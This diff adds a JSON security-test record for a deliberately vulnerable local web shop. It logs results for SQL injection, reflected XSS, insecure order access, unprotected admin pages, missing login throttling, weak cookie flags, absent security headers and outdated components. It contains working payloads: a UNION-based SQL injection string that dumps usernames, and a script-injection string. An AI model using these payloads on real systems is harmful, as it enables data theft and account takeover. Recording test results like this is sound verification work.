@@ -1,0 +1,109 @@
+{
+  "date": "2026-10-08T12:09:36",
+  "build": "before",
+  "git_ref": "v1-vulnerable",
+  "proofs": {
+    "V1": {
+      "request_normal": "GET /search?q=lamp",
+      "normal_status": 200,
+      "request_probe": "GET /search?q=zzz%' UNION SELECT id, username, 'x', 1.0, 1 FROM users --",
+      "probe_status": 200,
+      "usernames_returned_in_product_list": [
+        "admin",
+        "alice",
+        "bob"
+      ],
+      "login_with_quote_and_comment": {
+        "status": 302,
+        "location": "http://127.0.0.1:8080/"
+      },
+      "blocked": false
+    },
+    "V2": {
+      "request": "GET /search?q=<script>alert(1)</script>",
+      "status": 200,
+      "reflected_unescaped": true,
+      "blocked": false
+    },
+    "V3": {
+      "request": "GET /orders/<id> as alice, ids 1-4",
+      "alice_own_order_ids": [
+        1,
+        2
+      ],
+      "per_id": {
+        "1": {
+          "status": 200,
+          "own": true
+        },
+        "2": {
+          "status": 200,
+          "own": true
+        },
+        "3": {
+          "status": 200,
+          "own": false
+        },
+        "4": {
+          "status": 200,
+          "own": false
+        }
+      },
+      "blocked": false
+    },
+    "V4": {
+      "statuses": {
+        "anonymous": {
+          "/admin": 200,
+          "/admin/users": 200,
+          "/admin/products": 200
+        },
+        "alice": {
+          "/admin": 200,
+          "/admin/users": 200,
+          "/admin/products": 200
+        },
+        "admin": {
+          "/admin": 200,
+          "/admin/users": 200,
+          "/admin/products": 200
+        }
+      },
+      "anonymous_sees_user_list": true,
+      "blocked": false
+    },
+    "V5": {
+      "set_cookie_flags": [
+        "session=<value>; Path=/"
+      ],
+      "eight_wrong_passwords_statuses": [
+        401,
+        401,
+        401,
+        401,
+        401,
+        401,
+        401,
+        401
+      ],
+      "blocked": false
+    },
+    "V6": {
+      "missing_security_headers": [
+        "Content-Security-Policy",
+        "X-Content-Type-Options",
+        "X-Frame-Options",
+        "Referrer-Policy"
+      ],
+      "error_probe_status": 500,
+      "stack_trace_in_error_page": true,
+      "blocked": false
+    },
+    "V7": {
+      "jquery_status": 200,
+      "jquery_version_banner": "1.12.4",
+      "server_header": "Werkzeug/2.0.3 Python/3.11.14",
+      "blocked": false
+    }
+  }
+}
